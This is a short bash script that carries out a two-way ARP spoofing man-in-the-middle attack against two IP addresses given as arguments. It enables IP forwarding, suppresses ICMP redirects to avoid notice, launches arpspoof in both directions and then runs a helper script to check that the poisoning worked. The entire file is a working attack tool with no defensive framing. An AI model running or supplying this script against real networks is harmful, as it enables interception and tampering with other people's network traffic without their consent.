#! /bin/bash

#####################################
# Displays help
#####################################
function help(){
    echo "Usage: $0 ip_target1 ip_target2"
        exit 1
}

#####################################
# Checking is root
#####################################
if [ $(id -u) -ne 0 ]; then
    echo "You'd better be root! Exiting..."
    exit
fi

if [ $# -ne 2 ]; then
    help
fi

#####################################
# routing configuration
#####################################
echo "Setting configuration..."

sysctl -w net.ipv4.ip_forward=1 &>/dev/null

#avoid icmp redirect
echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects &>/dev/null

#####################################
# starting arp spoofing
#####################################
xterm -geometry 100x25+1+200 -T "arp spoofing ${1} -> ${2}" -hold -e arpspoof -t ${1} ${2} &
sleep 1
xterm -geometry 100x25+1+300 -T "arp spoofing ${2} -> ${1}" -hold -e arpspoof -t ${2} ${1} &

# wait
sleep 5

#####################################
# check poisoning
#####################################
chk_poison.py ${1} ${2}


